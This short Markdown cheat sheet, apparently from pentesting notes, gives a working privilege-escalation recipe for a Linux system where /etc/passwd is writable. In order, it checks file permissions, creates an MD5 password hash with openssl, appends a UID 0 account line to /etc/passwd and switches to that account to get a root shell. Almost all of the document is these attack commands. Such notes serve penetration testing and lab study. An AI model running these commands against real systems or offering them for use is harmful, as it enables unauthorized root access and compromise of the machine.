---
title: "Writable /etc/passwd"
date: 2024-7-1
tags: ["passwd", "shadow", "/etc/passwd", "privesc"]
---

---
### Abuse #1: Writable /etc/passwd

```bash
# Check
ls -l /etc/passwd /etc/shadow
```

```bash
# Create password hash
openssl passwd -1 password
```

```bash
# Add to /etc/passwd
echo 'user:$1$mQ8Xk.u8$XjFlyg01xLRjhCK/v//Qe/:0:0:comment:/root:/bin/bash' >> /etc/passwd
```

```bash
# Get root shell
su - user
```

<br>